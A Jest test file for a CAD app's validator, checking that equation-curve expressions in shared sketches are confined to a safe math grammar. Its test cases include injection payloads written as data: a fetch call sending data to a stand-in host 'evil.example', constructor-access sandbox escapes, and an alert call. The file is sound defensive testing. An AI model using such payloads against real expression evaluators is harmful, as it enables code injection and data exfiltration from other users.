'use strict';

// REQ 941 — equation-curve x(t)/y(t) expressions are untrusted shared content:
// a save whose expressions fall outside the sandboxed math grammar is rejected.

const { authenticatedRequest, createTestPart } = require('../../helpers');
const db = require('../../../models');
const { curveExprError } = require('../../../services/cadSafeExpr');

function docWith(xExpr, yExpr = '5*sin(t)') {
  return {
    sketches: {
      s1: {
        id: 's1', name: 'Sketch 1', hostId: 'xy_plane',
        state: { entities: [{ kind: 'equation', id: 'e1', xExpr, yExpr, tMin: 0, tMax: 6.28, samples: 64 }], constraints: [] },
        candidates: [],
      },
    },
    nextSketchSeq: 2,
  };
}

describe('Equation-curve expression validation (REQ 941)', () => {
  let auth, model;

  beforeEach(async () => {
    auth = await authenticatedRequest();
    const part = await createTestPart();
    model = (await auth.post(`/api/design/cad-model/by-part/${part.id}`).send({ name: 'M' })).body;
    await auth.post(`/api/design/cad-model/${model.id}/checkout`).send({});
  });

  test('a valid expression (including legacy Math. syntax) saves', async () => {
    const res = await auth.put(`/api/design/cad-model/${model.id}`).send({ sketchDoc: docWith('5*Math.cos(t)') });
    expect(res.status).toBe(200);
  });

  test.each([
    ['fetch("https://evil.example/" + t)'],
    ['constructor(1)'],
    ['t.constructor'],
    ['x = 1'],
  ])('rejects %s with a 400 naming the sketch and entity', async (expr) => {
    const res = await auth.put(`/api/design/cad-model/${model.id}`).send({ sketchDoc: docWith(expr) });
    expect(res.status).toBe(400);
    expect(res.body.error).toMatch(/Equation curve e1 in sketch "Sketch 1": x\(t\)/);
    const row = await db.DesignCADModel.findByPk(model.id);
    expect(JSON.stringify(row.sketchDoc)).not.toContain('evil.example');
  });

  test('validator unit cases', () => {
    expect(curveExprError('5*cos(t) + t^2')).toBeNull();
    expect(curveExprError('t > 1 ? t : 2*t')).toBeNull();
    expect(curveExprError("alert('x')")).toMatch(/quotes/);
    expect(curveExprError('toString(t)')).toMatch(/not allowed/);
    expect(curveExprError('map(t, t)')).toMatch(/not allowed/);
  });
});
